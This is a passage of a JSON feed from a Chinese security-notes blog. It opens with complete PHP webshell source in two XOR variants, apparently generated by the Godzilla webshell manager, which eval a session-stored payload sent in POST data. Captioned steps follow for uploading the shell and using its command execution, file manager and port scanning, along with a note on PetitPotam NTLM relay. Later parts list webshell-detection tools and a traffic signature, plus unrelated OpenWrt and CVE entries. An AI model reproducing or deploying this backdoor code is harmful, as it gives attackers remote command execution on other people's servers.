punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$payloadName</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token operator\">.</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token operator\">.</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</span></code></pre></div><p>PHP_XOR_RAW</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$payloadName</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</span></code></pre></div><p>生成jsp/jspx的webshell：（代码太长就不再列举）</p>\n<figure><figcaption>image-20230815144327087</figcaption></figure>\n<p>将文件上传到web服务器后，点击目标--添加</p>\n<figure><figcaption>image-20230815145351133</figcaption></figure>\n<figure><figcaption>image-20230815153411326</figcaption></figure>\n<p>若需要配置代理，需要在这里直接配置，比蚁剑的好处就是可以为不同的webshell配置不同代理</p>\n<figure><figcaption>image-20230815153435464</figcaption></figure>\n<p>测试一下连接，成功后即可点击添加</p>\n<figure><figcaption>image-20230815153523504</figcaption></figure>\n<p>然后选中添加好的shell，右键-进入</p>\n<figure><figcaption>image-20230815153706351</figcaption></figure>\n<figure><figcaption>image-20230815153759373</figcaption></figure>\n<p>命令执行：</p>\n<figure><figcaption>image-20230815153839913</figcaption></figure>\n<p>文件管理（刚进入是空白，需要点刷新）</p>\n<figure><figcaption>image-20230815153925634</figcaption></figure>\n<figure><figcaption>image-20230815142532681</figcaption></figure>\n<p>端口扫描</p>\n<figure><figcaption>image-20230815155547928</figcaption></figure>\n<p>数据库</p>\n<figure><figcaption>image-20230816103328924</figcaption></figure>\n<p>zip</p>\n<figure><figcaption>image-20230816103605171</figcaption></figure>\n<p>Pwebshellscan</p>\n<figure><figcaption>image-20230816103757195</figcaption></figure>\n<p>superTerminal</p>\n<figure><figcaption>image-20230816103939266</figcaption></figure>\n<p>PetitPotam 工具可用于对远程系统的目标计算机强制进行身份验证，通常目的在于执行 NTLM 中继攻击。如果 PetitPotam 将目标锁定为域控制器，攻击者可以向中继域控制器身份验证的另一台网络机器进行身份验证。https://github.com/topotam/PetitPotam</p>\n<h4>流量</h4>\n<p>PHP_EVAL_XOR_BASE64</p>\n<figure><figcaption>image-20230815152114365</figcaption></figure>\n<p>PHP_XOR_BASE64</p>\n<figure><figcaption>image-20230815152813461</figcaption></figure>\n<p>固定字符串如下，可检测</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>fL1tMGI4YTlj  79NDQm7r9PZzBiOA==\n</code></pre></div><p>JAVA_AES_BASE64 jsp流量</p>\n<figure><figcaption>image-20230816121318426</figcaption></figure>\n<h3>4. C刀(Cknife)</h3>\n<p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。</p>\n<p>github项目地址：https://github.com/Chora10/Cknife</p>\n<figure><figcaption>image-20230612162825691</figcaption></figure>\n<h2>WebShell查杀工具</h2>\n<p>当网站服务器被入侵时，我们需要一款WebShell检测工具，来帮助我们发现WebShell，进一步排查系统可能存在的安全漏洞。</p>\n<h3>1. D盾_Web查杀</h3>\n<p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。</p>\n<p>兼容性：只提供Windows版本。</p>\n<p>工具下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip</p>\n<figure><figcaption>image-20230530171344861</figcaption></figure>\n<h3>2. 河马</h3>\n<p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>\n<p>兼容性：支持Windows、linux，支持在线查杀。</p>\n<p>在线查杀网站：https://n.shellpub.com/</p>\n<p>官方网站：https://www.shellpub.com/</p>\n<figure><figcaption>image-20230530175337954</figcaption></figure>\n<p>有点慢</p>\n<h3>3. 百度WEBDIR+</h3>\n<p>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p>\n<p>兼容性：提供在线查杀木马，免费开放API支持批量检测。</p>\n<p>在线查杀地址：https://scanner.baidu.com/</p>\n<figure><figcaption>image-20230530171838366</figcaption></figure>\n<h3>4. Web Shell Detector</h3>\n<p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。</p>\n<p>兼容性：提供php/python脚本，可跨平台，在线检测。</p>\n<p>官方网站：http://www.shelldetector.com/</p>\n<p>github项目地址：https://github.com/emposha/PHP-Shell-Detector</p>\n<figure><figcaption>image-20230530174748026</figcaption></figure>\n<h3>5. CloudWalker（牧云）</h3>\n<p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p>\n<p>兼容性，提供linux版本，Windows 暂不支持。</p>\n<p>在线查杀demo：https://webshellchop.chaitin.cn/</p>\n<p>github项目地址：https://github.com/chaitin/cloudwalker</p>\n<figure><figcaption>image-20230530181115185</figcaption></figure>\n<h3>6. Sangfor WebShellKill</h3>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "OpenWrt安装使用",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/openwrt.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/openwrt.html",
      "summary": "OpenWrt安装使用\n1. 下载\n在阿里或者清华的镜像站，我这里下载的是最新版，链接如下：\n2. 解压并转格式\n下载下来的东西包了一层gz压缩壳，先解压它；解压完毕后，会发现解压出来的格式是img，需要转成vm认识的vmdk格式。\n安装StarWind V2V Converter，启动后默认下一步转换格式为vmdk即可。\n选择一个安装好的linux虚...",
      "content_html": "\n<h3>1. 下载</h3>\n<p>在阿里或者清华的镜像站，我这里下载的是最新版，链接如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.3/targets/x86/64/openwrt-22.03.3-x86-64-generic-ext4-combined-efi.img.gz\nhttps://mirrors.aliyun.com/openwrt/releases/22.03.3/targets/x86/64/openwrt-22.03.3-x86-64-generic-ext4-combined-efi.img.gz\n</code></pre></div><h3>2. 解压并转格式</h3>\n<p>下载下来的东西包了一层gz压缩壳，先解压它；解压完毕后，会发现解压出来的格式是img，需要转成vm认识的vmdk格式。</p>\n<p>安装<a href=\"https://www.starwindsoftware.com/tmplink/starwindconverter.exe\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>StarWind V2V Converter</strong></a>，启动后默认下一步转换格式为vmdk即可。</p>\n<p>选择一个安装好的linux虚拟机，把原来的硬盘删掉，重新添加后选择上面转换出来的vmdk文件。</p>\n<h3>3. 修改UI界面</h3>\n<p>打开虚拟机。等待一会后回车；输入命令<code>vim /etc/config/network</code>修改IP，改成与主机同网段的任意IP，保证主机能访问到即可（后续配置可以通过UI界面修改）；</p>\n<p>保存文件后，执行命令 <code>/etc/init.d/network reload</code>，这个时候应该可以看到eth0网卡和所绑定的IP。</p>\n<p>浏览器输入修改后的IP即可访问openwrt，下载中文包和一些主题，点击系统--软件包--上传软件包，上传后会自动安装（参考https://blog.csdn.net/user1913817/article/details/128674029）。</p>\n<p>安装好后点击系统--系统--语言和界面，选择语言和主题。</p>\n<h3>4. 配置网络</h3>\n<p>点击网络--接口--编辑，将协议修改为DHCP后保存并应用，删除原来的网络适配器，重新添加，VMware就会给这个虚拟机重新分配一个IP（公司内部选择NAT模式，防止IP冲突）。</p>\n<figure><figcaption>img1</figcaption></figure>\n<p>此时查看网络配置<code>vim /etc/config/network</code>，如下</p>\n<figure><figcaption>img2</figcaption></figure>\n<p>输入<code>ip a</code>命令，可以看到给OpenWrt分配的IP为192.168.13.64</p>\n<figure><figcaption>img3</figcaption></figure>\n<p>点击网络--网络诊断，可以测试网络是否配置成功</p>\n<figure><figcaption>img4</figcaption></figure>\n<h3>5. 安装OpenClash插件</h3>\n<p>github地址https://github.com/vernesong/OpenClash/releases，先安装依赖：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>opkg update\nopkg install coreutils-nohup bash iptables dnsmasq-full curl ca-certificates ipset ip-full iptables-mod-tproxy iptables-mod-extra libcap libcap-bin ruby ruby-yaml kmod-tun kmod-inet-diag unzip luci-compat luci luci-base\n</code></pre></div><p>下载https://github.com/vernesong/OpenClash/releases/download/v0.45.87-beta/luci-app-openclash_0.45.87-beta_all.ipk，通过系统--软件包--上传软件包，即可安装OpenClash，安装好后重启即可出现如下界面：</p>\n<figure><figcaption>img5</figcaption></figure>\n<h3>6. 配置代理</h3>\n<p>选择配置文件订阅，编辑好名字和订阅地址，勾选在线订阅转换，点击保存；</p>\n<figure><figcaption>img6</figcaption></figure>\n<p>勾选自动更新，然后保存配置</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Node.js 目录穿越漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Node.js/node_CVE-2017-14849.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Node.js/node_CVE-2017-14849.html",
      "summary": "漏洞名称：Node.js 目录穿越漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\nexpress这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于normalize函数。比如，express在判断path是否超出静态目录范围时，就用到了normalize函数，Node.js 8.5.0 对目录进行normalize...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Tomcat PUT方法任意写文件漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2017-12615.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2017-12615.html",
      "summary": "漏洞名称：Tomcat PUT方法任意写文件漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\n\nApache Tomcat是美国阿帕奇（Apache）软件基金会下属的Jakarta项目的一款轻量级Web应用服务器，它主要用于开发和调试JSP程序，适用于中小型系统。部分版本的Tomcat启用HTTP PUT请求方法时，远程攻击者可以...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Aapache Tomcat AJP 文件包含漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2020-1938.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2020-1938.html",
      "summary": "漏洞名称：Aapache Tomcat AJP 文件包含漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\nGhostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2017-10271.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2017-10271.html",
      "summary": "漏洞名称：Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\n\nOracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。O...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Weblogic 任意文件上传漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2018-2894.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2018-2894.html",
      "summary": "漏洞名称：Weblogic 任意文件上传漏洞\n\n漏洞介绍\n国家信息安全漏洞库 (cnnvd.org.cn)\nCNCERT发现了Oracle公司出品的基于JavaEE结构的中间件WebLogic产品存在一个远程上传漏洞，并得到了厂商的确认，危害程度评分高达9.8分。WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2020-14882.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2020-14882.html",
      "summary": "漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\nWeblogic是Oracle公司推出的J2EE应用服务器，Oracle WebLogic Server 多版本的Oracle Fusion Middleware 存在安全漏洞，该漏洞使未经身份验证的攻击者可以通过HTTP访问网...",
      "content_html": "\n<h2>漏洞介绍</h2>\n<blockquote>\n<p><a href=\"http://www.cnnvd.org.cn/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">国家信息安全漏洞库 (cnnvd.org.cn)</a></p>\n</blockquote>\n<p>Weblogic是Oracle公司推出的J2EE应用服务器，Oracle WebLogic Server 多版本的Oracle Fusion Middleware 存在安全漏洞，该漏洞使未经身份验证的攻击者可以通过HTTP访问网络，从而破坏Oracle WebLogic Server。在2020年10月的更新中，Oracle官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞，分别是CVE-2020-14882和CVE-2020-14883。</p>\n<p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>\n<p>参考链接：</p>\n<ul>\n<li>https://www.oracle.com/security-alerts/cpuoct2020traditional.html</li>\n<li>https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf</li>\n</ul>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "fastjson漏洞分析及复现",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/fastjson/FastjsonVul.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/fastjson/FastjsonVul.html",
      "summary": "fastjson漏洞分析及复现\nFastJson 是一个由阿里巴巴研发的java库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。\nfastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。\nfastjson 源码地址：https://github.com/alibaba/fa...",
